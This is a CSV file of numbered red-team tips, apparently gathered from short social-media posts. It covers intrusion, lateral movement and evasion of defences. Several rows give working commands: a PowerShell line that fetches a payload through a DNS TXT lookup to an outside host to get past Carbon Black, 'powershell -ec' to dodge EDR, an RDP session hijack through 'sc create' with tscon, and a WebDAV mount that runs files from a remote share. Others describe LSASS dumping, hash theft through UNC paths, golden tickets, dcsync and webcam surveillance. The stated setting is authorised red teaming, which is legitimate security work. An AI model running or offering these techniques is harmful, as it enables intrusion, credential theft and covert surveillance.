tipid,a,b,line
20,So apparently not many people use SSH for redirector setup. So try out ssh c2 -R *:80:localhost:80. SSH config GatewayPorts yes,,So apparently not many people use SSH for redirector setup. So try out ssh c2 -R *:80:localhost:80. SSH config GatewayPorts yes
21,Found open user home shares that are accessible? See if you can drop into Startup Programs for lateral movement and privesc.,,Found open user home shares that are accessible? See if you can drop into Startup Programs for lateral movement and privesc.
22,"Use VNC, microphone and webcam to perform surveillance. Netstat, tasklist can provide context into what the users doing.",,"Use VNC, microphone and webcam to perform surveillance. Netstat, tasklist can provide context into what the users doing."
23,Stash payloads in C:\$Recycle.Bin,,Stash payloads in C:\$Recycle.Bin
24,Compromise the SOC and Security teams to watch their progress and track their email alerts for sophisticated threats,,Compromise the SOC and Security teams to watch their progress and track their email alerts for sophisticated threats
25,"Probably dont do this on a red team, but spray for Welcome1, Password1 if youre struggling to move. But move off fast.",,"Probably dont do this on a red team, but spray for Welcome1, Password1 if youre struggling to move. But move off fast."
26,Split your campaigns up so that they are independent. Fire tons at once for decoys and to burn out the defence.,,Split your campaigns up so that they are independent. Fire tons at once for decoys and to burn out the defence.
27,"Need more credentials? Search for passwords on Sharepoint, and intranet.",,"Need more credentials? Search for passwords on Sharepoint, and intranet."
28,"Look for asset registers to understand who owns what machine, make and model. Theres usually an asset label to host name too!",,"Look for asset registers to understand who owns what machine, make and model. Theres usually an asset label to host name too!"
29,Lateral movement,"printers, open webroots, good old Tomcat, what are your quick wins?","Lateral movement printers, open webroots, good old Tomcat, what are your quick wins?"
30,Get AD credentials? Turn up on site and you might be able to use them to login to Corporate Wifi :),,Get AD credentials? Turn up on site and you might be able to use them to login to Corporate Wifi :)
31,Hunting e-mails and network shares for penetration testing reports can often yield good results.,,Hunting e-mails and network shares for penetration testing reports can often yield good results.
32,List mounts,"net use, look for shared folders and drop a UNC icon LNK into it. Run Inveigh or Wireshark on host to grab hashes.","List mounts net use, look for shared folders and drop a UNC icon LNK into it. Run Inveigh or Wireshark on host to grab hashes."
33,"Orgs are transitioning to cloud services such as AWS, Beanstalk, O365, Google Apps. 2FA is vital - password reset to compromise.",,"Orgs are transitioning to cloud services such as AWS, Beanstalk, O365, Google Apps. 2FA is vital - password reset to compromise."
34,OpSec. Set notifications to your phone for logins or intrusion attempts in any part of your attack infrastructure.,,OpSec. Set notifications to your phone for logins or intrusion attempts in any part of your attack infrastructure.
35,"FireEye sandbox flagging your payloads? Try anti sandbox techniques! If not, just use HTA to get into memory as it doesnt scan",,"FireEye sandbox flagging your payloads? Try anti sandbox techniques! If not, just use HTA to get into memory as it doesnt scan"
36,Dont forget the good old GPP passwords in SYSVOL. There may be cached GPP on the machine. Applying the patch isnt enough,,Dont forget the good old GPP passwords in SYSVOL. There may be cached GPP on the machine. Applying the patch isnt enough
37,Use GenHTA to generate HTA files that use anti-sandboxing techniques. https://github.com/vysec/GenHTA,,Use GenHTA to generate HTA files that use anti-sandboxing techniques. https://github.com/vysec/GenHTA
38,Having trouble getting @armitagehacker CobaltStrikes evil.hta through defenses? https://github.com/vysec/MorphHTA,,Having trouble getting @armitagehacker CobaltStrikes evil.hta through defenses? https://github.com/vysec/MorphHTA
39,"If emails get bounced, read the email! Sometimes due to malware scanners, spam etc. Or you may even get an out of office reply.",,"If emails get bounced, read the email! Sometimes due to malware scanners, spam etc. Or you may even get an out of office reply."
40,@0x09AL suggests looking for default credentials on printers and embedded devices. Move off initial foothold using this.,,@0x09AL suggests looking for default credentials on printers and embedded devices. Move off initial foothold using this.
41,@Oddvarmoe suggests using Alternate Data Streams if you need to put a file on disk. For example https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1,,@Oddvarmoe suggests using Alternate Data Streams if you need to put a file on disk. For example https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1
42,"Got OS level access to a middle tier? Task list, netstat and wmic process list full | findstr /I commandline for more ideas!",,"Got OS level access to a middle tier? Task list, netstat and wmic process list full | findstr /I commandline for more ideas!"
43,So you know where the server application files are. Download the binaries and check out configuration files for conn. strings,,So you know where the server application files are. Download the binaries and check out configuration files for conn. strings
44,Run PEiD and other packer / technology checkers to find out the language and packer used on downloaded server binaries.,,Run PEiD and other packer / technology checkers to find out the language and packer used on downloaded server binaries.
45,Run strings on the application binary for potentially other cleartext sensitive strings! (Unicode mode too),,Run strings on the application binary for potentially other cleartext sensitive strings! (Unicode mode too)
46,On a VDI? Check out C:\ and other disks for potentially sensitive files other users may have saved there.,,On a VDI? Check out C:\ and other disks for potentially sensitive files other users may have saved there.
47,Incase EDR are looking for net users /domain try using net use /dom,,Incase EDR are looking for net users /domain try using net use /dom
48,Is EDR potentially looking for powershell -encodedcommand? Try powershell -ec,,Is EDR potentially looking for powershell -encodedcommand? Try powershell -ec
49,Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system,,Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system
50,Carbon Black checks for IEX and web req commands. Use powershell powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1],,Carbon Black checks for IEX and web req commands. Use powershell powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]
51,Cant open C drive? Try \\127.0.0.1\c$,,Cant open C drive? Try \\127.0.0.1\c$
52,SC doesnt take credentials. Cant use runas? Try net use \\targetip\ipc$ password /u:domain\username then sc to psexec,,SC doesnt take credentials. Cant use runas? Try net use \\targetip\ipc$ password /u:domain\username then sc to psexec
53,"When stick phishing for 2FA, consider using @mrgretzky Evilginx project which logs cookies. https://breakdev.org/evilginx-1-1-release/",,"When stick phishing for 2FA, consider using @mrgretzky Evilginx project which logs cookies. https://breakdev.org/evilginx-1-1-release/"
54,Hide from blue. Volume shadow copy then execute \\?\GLOBALROOT\Device\HarddiskVolumeShadowColy1\malware.exe/dll then delete VSC,,Hide from blue. Volume shadow copy then execute \\?\GLOBALROOT\Device\HarddiskVolumeShadowColy1\malware.exe/dll then delete VSC
55,SMB hash leaking using a UNC path for image in page for drive by leak can give you credentials for less mature environments.,,SMB hash leaking using a UNC path for image in page for drive by leak can give you credentials for less mature environments.
56,Target victims using email authentication such as Microsoft Account on Windows 10? Hash leak exposes full email address!,,Target victims using email authentication such as Microsoft Account on Windows 10? Hash leak exposes full email address!
57,Working in teams yields better results; and best of all Makes Offensive operations more fun and keeps the adrenaline pumping,,Working in teams yields better results; and best of all Makes Offensive operations more fun and keeps the adrenaline pumping
58,"Discuss business targets and objectives with your clients. This process should set non technical goals such as ""ATM spit money""",,"Discuss business targets and objectives with your clients. This process should set non technical goals such as ""ATM spit money"" "
59,Checking whether a server or host is good for egress? Likely to go down? systeminfo | findstr /i boot,,Checking whether a server or host is good for egress? Likely to go down? systeminfo | findstr /i boot
60,Type query user to see who else is connected to the machine.,,Type query user to see who else is connected to the machine.
61,Get a quick patch list using wmic qfe list brief. Cross ref KB to bulletins.,,Get a quick patch list using wmic qfe list brief. Cross ref KB to bulletins.
62,Found a process of interest? Dont forget to obtain a MiniDump! Use Out-MiniDump https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1,,Found a process of interest? Dont forget to obtain a MiniDump! Use Out-MiniDump https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
63,"Finally in CyberArk, click policies and see safes but no account? Go to accounts search and search for empty and safes show up",,"Finally in CyberArk, click policies and see safes but no account? Go to accounts search and search for empty and safes show up"
64,Is WebDav allowed through the gateway? Using http mini redirector? Dont exfiltrate or send in files. WebDav is subject to DLP,,Is WebDav allowed through the gateway? Using http mini redirector? Dont exfiltrate or send in files. WebDav is subject to DLP
65,WebDav mini http redirector,net use * http://totallylegit.com/share then start z:,WebDav mini http redirector net use * http://totallylegit.com/share then start z:
66,"Found potential MQ creds? ActiveMQ? Try out https://github.com/fmtn/a , works to query MQ endpoints that dont use self signed crt",,"Found potential MQ creds? ActiveMQ? Try out https://github.com/fmtn/a , works to query MQ endpoints that dont use self signed crt"
67,Use vssadmin to list and create volume shadow copies,,Use vssadmin to list and create volume shadow copies
68,Pivoting into a secure zone that has no DNS or web gateway and need exfil? Netsh port forward pivot UDP 53 to DNS 53 then boom,,Pivoting into a secure zone that has no DNS or web gateway and need exfil? Netsh port forward pivot UDP 53 to DNS 53 then boom
69,Have blue hidden the ways including winkey+R? Try shift and right click desktop and open command prompt,,Have blue hidden the ways including winkey+R? Try shift and right click desktop and open command prompt
70,Tracked down that putty session? Popped the box? Query user and check the victims logon time and idle times,,Tracked down that putty session? Popped the box? Query user and check the victims logon time and idle times
71,"Hijack his Session using sc create sesshijack binpath= ""cmd.exe /k tscon <ID> /dest:<SESSIONNAME>"" then use putty session",,"Hijack his Session using sc create sesshijack binpath= ""cmd.exe /k tscon <ID> /dest:<SESSIONNAME>"" then use putty session "
72,Most people understand email sec wrong. SPF does not mean not spoofable. SPF does nothing without DMARC.,,Most people understand email sec wrong. SPF does not mean not spoofable. SPF does nothing without DMARC.
73,Weak DMARC on victim org domain? Spoof their own emails back into themselves! You even inherit their AD name and photo,,Weak DMARC on victim org domain? Spoof their own emails back into themselves! You even inherit their AD name and photo
74,Got access to Microsoft OWA mailbox or O365? You can extract global catalog from contacts use @Burp_Suite and parse JSON object,,Got access to Microsoft OWA mailbox or O365? You can extract global catalog from contacts use @Burp_Suite and parse JSON object
75,Write PHP delivery scripts that can mutate your payloads and add unique trackers per download. This tracks file being executed,,Write PHP delivery scripts that can mutate your payloads and add unique trackers per download. This tracks file being executed
76,Simulating a criminal threat story with smash and grab agenda? Phish users and hot swap payload mid campaign to test formats,,Simulating a criminal threat story with smash and grab agenda? Phish users and hot swap payload mid campaign to test formats
77,RCE on a web application for less mature client? nslookup -q=srv _ldap._tcpif its domain joined Invoke-Kerberoast,,RCE on a web application for less mature client? nslookup -q=srv _ldap._tcpif its domain joined Invoke-Kerberoast
78,@benichmt1 suggests looking for vmdk files across the network. You can use this to potentially access segregated networks,,@benichmt1 suggests looking for vmdk files across the network. You can use this to potentially access segregated networks
79,"Obfuscation is never bad, especially when its a button click. @danielhbohannon - https://github.com/danielbohannon",,"Obfuscation is never bad, especially when its a button click. @danielhbohannon - https://github.com/danielbohannon"
80,"Need to sweep for uptimes? Use wmic /node:""<computer>"" OS get LastBootUpTime in a for loop",,"Need to sweep for uptimes? Use wmic /node:""<computer>"" OS get LastBootUpTime in a for loop "
81,"Looking for systems running KeePass? Run a for loop on wmic /node:""host"" process list brief :) then look at RT #82",,"Looking for systems running KeePass? Run a for loop on wmic /node:""host"" process list brief :) then look at RT #82"
82,Found KeePass running in memory? Use @harmj0y KeeThief to extract password and dl the KDBX - https://github.com/HarmJ0y/KeeThief,,Found KeePass running in memory? Use @harmj0y KeeThief to extract password and dl the KDBX - https://github.com/HarmJ0y/KeeThief
83,Struggling to find a working DB client? Live off the land and use your victims in an RDP session.,,Struggling to find a working DB client? Live off the land and use your victims in an RDP session.
84,"Im sure everyone hates Oracle DB but no sweat, you can proxycap sqldeveloper.exe",,"Im sure everyone hates Oracle DB but no sweat, you can proxycap sqldeveloper.exe"
85,Check the users calendars before using persistence on their machine. They may be out of office and screw your master plans.,,Check the users calendars before using persistence on their machine. They may be out of office and screw your master plans.
86,"Red team and attack simulation is not penetration testing. You shouldnt be really testing anything, but simply infiltrating.",,"Red team and attack simulation is not penetration testing. You shouldnt be really testing anything, but simply infiltrating."
87,@Oddvarmoe uses .UDL files to quickly launch a MSSQL connection test to validate credentials! https://blogs.msdn.microsoft.com/farukcelik/2007/12/31/basics-first-udl-test/,,@Oddvarmoe uses .UDL files to quickly launch a MSSQL connection test to validate credentials! https://blogs.msdn.microsoft.com/farukcelik/2007/12/31/basics-first-udl-test/
88,Dont forget Physical security! Whip up a PI with GSM and you can hack your way in by dropping the PI on network.,,Dont forget Physical security! Whip up a PI with GSM and you can hack your way in by dropping the PI on network.
89,regsvr32 SCT files are being detected as Squigglydoo. Looks for script case sensitive and <registration case insensitive.,,regsvr32 SCT files are being detected as Squigglydoo. Looks for script case sensitive and <registration case insensitive.
90,"Cisco NGIPS is shit, when analysing traffic for havex it drops only <havexhavex> but not <havexDATABLOBhavex>",,"Cisco NGIPS is shit, when analysing traffic for havex it drops only <havexhavex> but not <havexDATABLOBhavex>"
91,"Decoys can be as simple as burning egress by port scanning 1-1024 through IDS, or spamming dodgy emails at blocks of employees",,"Decoys can be as simple as burning egress by port scanning 1-1024 through IDS, or spamming dodgy emails at blocks of employees"
92,"If WDigest is disabled, reenable it for cleartext credentials before new users login with @harmj0y https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1",,"If WDigest is disabled, reenable it for cleartext credentials before new users login with @harmj0y https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1"
93,"Use Empyre to generate Macintosh and Linux payloads, modify it to contain code for Windows too! https://github.com/EmpireProject/EmPyre",,"Use Empyre to generate Macintosh and Linux payloads, modify it to contain code for Windows too! https://github.com/EmpireProject/EmPyre"
94,Client uses VDIs? Compromise underlying host and use Citrix Shadow Taskbar to spy on VDI sessions by selecting username,,Client uses VDIs? Compromise underlying host and use Citrix Shadow Taskbar to spy on VDI sessions by selecting username
95,@domchell recommends avoiding non persistent VDIs and persist on laptops. Query DC for live laptops.,,@domchell recommends avoiding non persistent VDIs and persist on laptops. Query DC for live laptops.
96,@lucasgates recommends using OLE objects containing VBS scripts instead of Macros as less suspicious. VBE will work too,,@lucasgates recommends using OLE objects containing VBS scripts instead of Macros as less suspicious. VBE will work too
97,Use recent critical vulnerabilities such as CVE-2017-0199 HTA handler issue to simulate real threats. https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/,,Use recent critical vulnerabilities such as CVE-2017-0199 HTA handler issue to simulate real threats. https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/
98,@0x09AL suggests WordSteal. You can embed an IMAGE with UNC path to steal hashes from Word. Wont work if proxy. https://github.com/0x09AL/WordSteal,,@0x09AL suggests WordSteal. You can embed an IMAGE with UNC path to steal hashes from Word. Wont work if proxy. https://github.com/0x09AL/WordSteal
99,If client is using Proxy with WebDav you can phish creds using @ryHanson Phishery https://github.com/ryhanson/phishery,,If client is using Proxy with WebDav you can phish creds using @ryHanson Phishery https://github.com/ryhanson/phishery
100,Use wgsidav if you need a quick WebDav server :) https://github.com/mar10/wsgidav,,Use wgsidav if you need a quick WebDav server :) https://github.com/mar10/wsgidav
101,Set up red team infrastructure following @bluscreenofjeff guidelines! https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki,,Set up red team infrastructure following @bluscreenofjeff guidelines! https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki
102,Easier DNS redirector!,,Easier DNS redirector!
103,Red team tips are useful but what makes the good red teamer is experience. Rack up that breadth of experience,,Red team tips are useful but what makes the good red teamer is experience. Rack up that breadth of experience
104,SessionGopher does a decent job at retrieving putty and RDP history - https://github.com/fireeye/SessionGopher,,SessionGopher does a decent job at retrieving putty and RDP history - https://github.com/fireeye/SessionGopher
105,"If ping 8.8.8.8 works, try ICMP tunnelling. More info at http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html?m=1 from @fragsh3ll though only on immature network",,"If ping 8.8.8.8 works, try ICMP tunnelling. More info at http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html?m=1 from @fragsh3ll though only on immature network"
106,Wordlists? https://github.com/berzerk0/Probable-WordlistsI like to use the top probable 297 million list with Deadhobo rules,,Wordlists? https://github.com/berzerk0/Probable-WordlistsI like to use the top probable 297 million list with Deadhobo rules
107,More of a pentest tip but nslookup google.com if it resolves you may have a DNS tunnelling problem.,,More of a pentest tip but nslookup google.com if it resolves you may have a DNS tunnelling problem.
108,Post exploitation Asset Discovery https://github.com/vysec/Invoke-DNSDiscovery looks for assets by name that might be good if youre low priv user.,,Post exploitation Asset Discovery https://github.com/vysec/Invoke-DNSDiscovery looks for assets by name that might be good if youre low priv user.
109,Use Invoke-ProcessScan to give some running processes context on a system. This uses EQGRP leaked list- https://github.com/vysec/Invoke-ProcessScan,,Use Invoke-ProcessScan to give some running processes context on a system. This uses EQGRP leaked list- https://github.com/vysec/Invoke-ProcessScan
110,Mature blue? Be careful and minidump lssas.exe then download it and parse locally,,Mature blue? Be careful and minidump lssas.exe then download it and parse locally
111,Found an exploitable S4U condition? Use Mistique to attack! https://github.com/machosec/Mystique/blob/master/Mystique.ps1,,Found an exploitable S4U condition? Use Mistique to attack! https://github.com/machosec/Mystique/blob/master/Mystique.ps1
112,Need to use VNC as RDP in use? https://github.com/artkond/Invoke-Vnchas been pretty stable for me. Run it then pivot in and connect!,,Need to use VNC as RDP in use? https://github.com/artkond/Invoke-Vnchas been pretty stable for me. Run it then pivot in and connect!
113,Found super secret.doc or master password database.xlsx? Use office2john to get hash and crack in Hashcat!,,Found super secret.doc or master password database.xlsx? Use office2john to get hash and crack in Hashcat!
114,"PowerUp didnt work and you want to autoruns? Dont bother going on disk, use Invoke-AutoRuns to csv- https://github.com/p0w3rsh3ll/AutoRuns",,"PowerUp didnt work and you want to autoruns? Dont bother going on disk, use Invoke-AutoRuns to csv- https://github.com/p0w3rsh3ll/AutoRuns"
115,Need to zip up a directory quickly for easy exfiltration? Eg. Home shares https://github.com/thoemmi/7Zip4Powershell use Powershell,,Need to zip up a directory quickly for easy exfiltration? Eg. Home shares https://github.com/thoemmi/7Zip4Powershell use Powershell
116,Use CatMyFish to search for categorised domains that could be used in your engagements - https://github.com/Mr-Un1k0d3r/CatMyFish,,Use CatMyFish to search for categorised domains that could be used in your engagements - https://github.com/Mr-Un1k0d3r/CatMyFish
117,Ran Invoke-MapDomainTrusts from PowerView? Use @harmj0y DomainTrustExplorer to generate a graph https://github.com/sixdub/DomainTrustExplorer,,Ran Invoke-MapDomainTrusts from PowerView? Use @harmj0y DomainTrustExplorer to generate a graph https://github.com/sixdub/DomainTrustExplorer
118,FOCA finds some useful information for OSINT and intelligence phases. https://www.elevenpaths.com/labstools/foca/index.html,,FOCA finds some useful information for OSINT and intelligence phases. https://www.elevenpaths.com/labstools/foca/index.html
119,GoPhish is a pretty useful tool for spinning up simple phishing campaigns especially for decoys https://getgophish.com,,GoPhish is a pretty useful tool for spinning up simple phishing campaigns especially for decoys https://getgophish.com
120,If you have write access to the orgs shared Office template folders You can privesc by backdooring these trusted documents.,,If you have write access to the orgs shared Office template folders You can privesc by backdooring these trusted documents.
121,@zwned uses netsh packet tracing to sniff natively from victim host. Save capture and analyze offline!,,@zwned uses netsh packet tracing to sniff natively from victim host. Save capture and analyze offline!
122,More decoy tips! Scan the external perimeter with tools like Nessus and OpenVAS. More traffic the better just to burn the blue,,More decoy tips! Scan the external perimeter with tools like Nessus and OpenVAS. More traffic the better just to burn the blue
123,"Read Sean Metcalfa blog http://adsecurity.org/ When AD is used in many environments, it vital to at least know techniques",,"Read Sean Metcalfa blog http://adsecurity.org/ When AD is used in many environments, it vital to at least know techniques"
124,Remember you can generate a golden ticket offline with knowledge of krbtgt and rest offline. Golden ticket gets silver from DC,,Remember you can generate a golden ticket offline with knowledge of krbtgt and rest offline. Golden ticket gets silver from DC
125,Got krbtgt of a child domain? Forest parent trusts you? Use the SID history attack in golden tickets to escalate to Ent Admin,,Got krbtgt of a child domain? Forest parent trusts you? Use the SID history attack in golden tickets to escalate to Ent Admin
126,"You dont necessarily need Domain Admin, if you have an account that has Replicating directory changes rights, dcsync to pull hash using that account.",,"You dont necessarily need Domain Admin, if you have an account that has Replicating directory changes rights, dcsync to pull hash using that account."
127,Planning to use secretsdump.py? :) Try using the DC machine account to authenticate and dump instead of a user! Save hash,,Planning to use secretsdump.py? :) Try using the DC machine account to authenticate and dump instead of a user! Save hash
128,Use machine account hashes to generate silver tickets to a host for persistence. Save machine hash for DC incase krbtgt rotate,,Use machine account hashes to generate silver tickets to a host for persistence. Save machine hash for DC incase krbtgt rotate
129,Use PEAS to query shares and emails if using ActiveSync - https://github.com/mwrlabs/peas,,Use PEAS to query shares and emails if using ActiveSync - https://github.com/mwrlabs/peas
130,(Not red really but useful) Sort IPs,"cat IPs.txt | sort -t . -k1,1 -k2,2 -k3,3 -k4,4 or even `cat IPs.txt | sort -v""","(Not red really but useful) Sort IPs cat IPs.txt | sort -t . -k1,1 -k2,2 -k3,3 -k4,4 or even `cat IPs.txt | sort -v"""
131,Learn AWK and general bash scripting. Processing and merging of data sets speeds up our job for discovery and time keeping.,,Learn AWK and general bash scripting. Processing and merging of data sets speeds up our job for discovery and time keeping.
132,Worth learning to pick locks and the dust can sensor trick if youre going to do some physical. http://www.artofmanliness.com/2014/11/19/how-to-pick-a-lock-pin-tumbler-locks/,,Worth learning to pick locks and the dust can sensor trick if youre going to do some physical. http://www.artofmanliness.com/2014/11/19/how-to-pick-a-lock-pin-tumbler-locks/
133,Grep has an extract flag -o that can be used to extract from a regex. Good for extracting data from massive blobs.,,Grep has an extract flag -o that can be used to extract from a regex. Good for extracting data from massive blobs.
134,"Victims use wireless? Use KARMA attack to force them onto your network. Use eternalblue, domain creds or other vulns to get in. https://github.com/sensepost/mana",,"Victims use wireless? Use KARMA attack to force them onto your network. Use eternalblue, domain creds or other vulns to get in. https://github.com/sensepost/mana"
135,"Phishing pages are usually custom. However its always good to have a stash for decoys. Generic Gmail, Office365?",,"Phishing pages are usually custom. However its always good to have a stash for decoys. Generic Gmail, Office365?"
136,Keep up to date by watching presentations from conferences on YouTube :) Discover useful techniques,,Keep up to date by watching presentations from conferences on YouTube :) Discover useful techniques
137,"If youve exhausted all payload types, try sending a Mac user a python one liner and Win PS 1 liner. Ive had people run it.",,"If youve exhausted all payload types, try sending a Mac user a python one liner and Win PS 1 liner. Ive had people run it."
139,"If you need to get a clean EXE for file drop and exec, try out @midnite_runr Backdoor Factory - https://github.com/secretsquirrel/the-backdoor-factory",,"If you need to get a clean EXE for file drop and exec, try out @midnite_runr Backdoor Factory - https://github.com/secretsquirrel/the-backdoor-factory"
140,If enemy does not use proxy with TLS inspection then you can use https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/ to mask your c2 channel further,,If enemy does not use proxy with TLS inspection then you can use https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/ to mask your c2 channel further
141,On a Linux box and want to egress from it over a proxy? Use ProxyTunnel to pipe SSH - https://github.com/proxytunnel/proxytunnel,,On a Linux box and want to egress from it over a proxy? Use ProxyTunnel to pipe SSH - https://github.com/proxytunnel/proxytunnel
142,Need some OSINT? Keep Spiderfoot running long term to accompany your manual OSINT sources http://www.spiderfoot.net,,Need some OSINT? Keep Spiderfoot running long term to accompany your manual OSINT sources http://www.spiderfoot.net
143,OSINTing? TheHarvester does a decent job at subdomains. Though theres better ways to get emails bulk. https://github.com/laramies/theHarvester,,OSINTing? TheHarvester does a decent job at subdomains. Though theres better ways to get emails bulk. https://github.com/laramies/theHarvester
144,Exploring and want to use WMI? https://www.microsoft.com/en-us/download/details.aspx?id=8572 is pretty useful for exploring the different namespaces and classes.,,Exploring and want to use WMI? https://www.microsoft.com/en-us/download/details.aspx?id=8572 is pretty useful for exploring the different namespaces and classes.
145,Need to reset a password? Do it then quickly dcsync for previous password hash and use NTLMinject - https://github.com/vletoux/NTLMInjector,,Need to reset a password? Do it then quickly dcsync for previous password hash and use NTLMinject - https://github.com/vletoux/NTLMInjector
146,"IDS flagging known payload binary blob? Base64 encode it in your payload and use certutil, PS or VB to decode it!",,"IDS flagging known payload binary blob? Base64 encode it in your payload and use certutil, PS or VB to decode it!"
147,Test your phishing campaigns before sending!!!,,Test your phishing campaigns before sending!!!
148,"If youre sending into Exchange, make sure your SMTP server is not in SPAM list or black lists. Check junk mails mail headers",,"If youre sending into Exchange, make sure your SMTP server is not in SPAM list or black lists. Check junk mails mail headers"
149,Use Microsofts Message Header Analyzer to parse and review email headers from Outlook. https://testconnectivity.microsoft.com/MHA/Pages/mha.aspx,,Use Microsofts Message Header Analyzer to parse and review email headers from Outlook. https://testconnectivity.microsoft.com/MHA/Pages/mha.aspx
